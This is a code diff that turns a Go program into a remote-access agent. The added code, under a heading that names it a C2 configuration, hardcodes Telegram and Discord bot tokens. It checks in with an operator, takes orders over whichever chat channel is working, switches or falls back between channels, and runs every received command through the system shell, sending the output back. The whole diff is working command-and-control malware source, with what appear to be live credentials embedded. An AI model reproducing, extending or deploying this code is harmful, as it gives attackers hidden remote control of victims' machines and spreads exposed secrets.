@@ -1,112 +1,211 @@
 package main
 
 import (
+	"context"
 	"fmt"
 	"log"
 	"os"
 	"os/exec"
+	"os/signal"
 	"runtime"
-	"strconv"
 	"strings"
+	"syscall"
 	"time"
 
-	"github.com/joho/godotenv"
-	"telegram-client/telegram"
+	"agent/channels/discord"
+	"agent/channels/telegram"
+	"agent/core"
+)
+
+// ─────────────────────────────────────────
+// Hardcoded C2 configuration
+// ─────────────────────────────────────────
+const (
+	telegramToken  = "8701233445:AAFFFMkoFV3UnDYGozcVSS0ONY8gQzwr1Vw"
+	telegramChatID = int64(-1003728125166)
+	discordToken   = "MTQ5MDI5MjcwOTcwODE0MDY0NQ.G-1l_H.g6uRMaNBy_bo5Xz0AufjsQqclwrawtIk-tTyV8"
 )
 
 func main() {
-	if err := godotenv.Load(); err != nil {
-		log.Fatal("❌ Error loading .env file")
+	cfg := core.LoadConfig()
+
+	// Generate deterministic agent identity (hash of token + hostname)
+	agentID := core.AgentID(telegramToken)
+	log.Printf("Agent ID: %s", agentID)
+
+	// Build all available channels
+	channelMap := buildChannelMap(agentID)
+	if len(channelMap) == 0 {
+		log.Fatal("No channels available — cannot operate")
 	}
 
-	token     := os.Getenv("BOT_TOKEN")
-	chatIDStr := os.Getenv("CHAT_ID")
+	// Context for clean shutdown via OS signals
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
 
-	chatID, err := strconv.ParseInt(chatIDStr, 10, 64)
-	if err != nil {
-		log.Fatalf("❌ Invalid CHAT_ID: %v", err)
-	}
+	go func() {
+		stop := make(chan os.Signal, 1)
+		signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
+		<-stop
+		log.Println("Shutdown signal received")
+		cancel()
+	}()
 
-	client := telegram.NewClient(token, chatID)
-	fmt.Println("🤖 Go client started. Waiting for commands...")
+	// Start the resilient channel loop
+	activeChannel := cfg.PrimaryChannel
+	runWithSwitching(ctx, channelMap, activeChannel, agentID, cfg)
+}
 
-	offset := -1
+// ─────────────────────────────────────────
+// Channel map builder
+// ─────────────────────────────────────────
+
+func buildChannelMap(agentID string) map[string]core.C2Channel {
+	channels := make(map[string]core.C2Channel)
+
+	channels["telegram"] = telegram.NewClient(telegramToken, telegramChatID, agentID, executeCommand)
+	log.Printf("Telegram channel available")
+
+	channels["discord"] = discord.NewClient(discordToken, agentID, executeCommand)
+	log.Printf("Discord channel available")
+
+	return channels
+}
+
+// ─────────────────────────────────────────
+// Main loop — connect, check-in, listen, switch
+// ─────────────────────────────────────────
+
+func runWithSwitching(ctx context.Context, channels map[string]core.C2Channel, startChannel string, agentID string, cfg *core.AgentConfig) {
+	activeChannelName := startChannel
 
 	for {
-		updates, err := client.GetUpdates(offset)
-		if err != nil {
-			log.Printf("❌ Error fetching updates: %v", err)
-			time.Sleep(2 * time.Second)
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
+
+		ch, exists := channels[activeChannelName]
+		if !exists {
+			log.Printf("Channel '%s' not found — trying fallback", activeChannelName)
+			activeChannelName = pickFallback(channels, activeChannelName)
+			if activeChannelName == "" {
+				log.Fatal("No channels available for fallback")
+			}
 			continue
 		}
 
-		for _, update := range updates {
-			offset = update.UpdateID + 1
+		log.Printf("Connecting to channel: %s", ch.Name())
 
-			msg := update.Message
-			if msg.Text == "" || msg.Chat.ID != chatID {
-				continue
+		if err := ch.Connect(); err != nil {
+			log.Printf("[%s] Connect failed: %v — trying fallback", ch.Name(), err)
+			activeChannelName = pickFallback(channels, activeChannelName)
+			if activeChannelName == "" {
+				log.Printf("All channels exhausted — waiting %v before retry", cfg.RetryInterval)
+				time.Sleep(cfg.RetryInterval)
+				activeChannelName = startChannel // reset and try again
 			}
-
-			if !strings.HasPrefix(msg.Text, "INSTRUCTION|") {
-				continue
-			}
-
-			parts := strings.SplitN(msg.Text, "|", 3)
-			if len(parts) != 3 {
-				continue
-			}
-
-			instructionID := parts[1]
-			command        := parts[2]
-
-			fmt.Printf("📥 [%s] $ %s\n", instructionID, command)
-
-			// Execute in goroutine — don't block polling
-			go func(id, cmd string) {
-				output := executeCommand(cmd)
-
-				// Telegram has a 4096 char message limit — truncate if needed
-				if len(output) > 3800 {
-					output = output[:3800] + "\n... (truncated)"
-				}
-
-				result := fmt.Sprintf("RESULT|%s|%s", id, output)
-				if err := client.SendMessage(result); err != nil {
-					log.Printf("❌ Failed to send result: %v", err)
-				} else {
-					fmt.Printf("✅ [%s] Result sent\n", id)
-				}
-			}(instructionID, command)
+			continue
 		}
+
+		log.Printf("[%s] Connected successfully", ch.Name())
+
+		// Send CHECKIN on the active channel
+		checkinMsg := core.BuildCheckin(agentID)
+		if err := ch.SendMessage(checkinMsg); err != nil {
+			log.Printf("[%s] Failed to send CHECKIN: %v", ch.Name(), err)
+		} else {
+			log.Printf("[%s] CHECKIN sent", ch.Name())
+		}
+
+		// Listen — blocks until error, context cancel, or SWITCH
+		err := ch.Listen(ctx)
+
+		ch.Disconnect()
+
+		// Check if this was a SWITCH command
+		if targetChannel, isSwitchErr := core.IsSwitchError(err); isSwitchErr {
+			log.Printf("[%s] Switching to channel: %s", ch.Name(), targetChannel)
+			activeChannelName = targetChannel
+
+			// Connect to new channel and send SWITCHACK + CHECKIN
+			newCh, exists := channels[targetChannel]
+			if !exists {
+				log.Printf("Requested channel '%s' not available — staying on %s", targetChannel, ch.Name())
+				activeChannelName = ch.Name()
+				continue
+			}
+
+			if err := newCh.Connect(); err != nil {
+				log.Printf("[%s] Switch failed to connect: %v — falling back", targetChannel, err)
+				activeChannelName = pickFallback(channels, targetChannel)
+				continue
+			}
+
+			// Send SWITCHACK and CHECKIN on the new channel
+			switchAck := fmt.Sprintf("SWITCHACK|%s|%s", agentID, targetChannel)
+			newCh.SendMessage(switchAck)
+			newCh.SendMessage(checkinMsg)
+			log.Printf("[%s] SWITCHACK + CHECKIN sent", targetChannel)
+
+			// Listen on new channel
+			err = newCh.Listen(ctx)
+			newCh.Disconnect()
+
+			// If another switch happens, loop will handle it
+			if nextTarget, isSwitchErr := core.IsSwitchError(err); isSwitchErr {
+				activeChannelName = nextTarget
+				continue
+			}
+		}
+
+		// If context was cancelled, exit cleanly
+		if ctx.Err() != nil {
+			return
+		}
+
+		// Channel died — retry
+		log.Printf("[%s] Channel lost — retrying in %v", activeChannelName, cfg.RetryInterval)
+		time.Sleep(cfg.RetryInterval)
 	}
 }
 
-// executeCommand runs a shell command and returns its output (stdout + stderr)
+// pickFallback returns the name of the first channel that isn't the current one.
+func pickFallback(channels map[string]core.C2Channel, current string) string {
+	for name := range channels {
+		if name != current {
+			return name
+		}
+	}
+	return ""
+}
+
+// ─────────────────────────────────────────
+// Shell executor (shared across all channels)
+// ─────────────────────────────────────────
+
 func executeCommand(cmd string) string {
 	var command *exec.Cmd
 
-	// Support both Linux/Mac and Windows
 	if runtime.GOOS == "windows" {
 		command = exec.Command("cmd", "/C", cmd)
 	} else {
 		command = exec.Command("sh", "-c", cmd)
 	}
 
-	// Capture both stdout and stderr
 	out, err := command.CombinedOutput()
 
 	if err != nil {
-		// Still return output even if command failed (e.g. non-zero exit)
 		if len(out) > 0 {
-			return fmt.Sprintf("%s\n⚠️ Exit error: %s", strings.TrimSpace(string(out)), err.Error())
+			return fmt.Sprintf("%s\nExit error: %s", strings.TrimSpace(string(out)), err.Error())
 		}
-		return fmt.Sprintf("❌ Error: %s", err.Error())
+		return fmt.Sprintf("Error: %s", err.Error())
 	}
 
 	output := strings.TrimSpace(string(out))
 	if output == "" {
-		return "✅ Command executed (no output)"
+		return "Command executed (no output)"
 	}
 	return output
 }
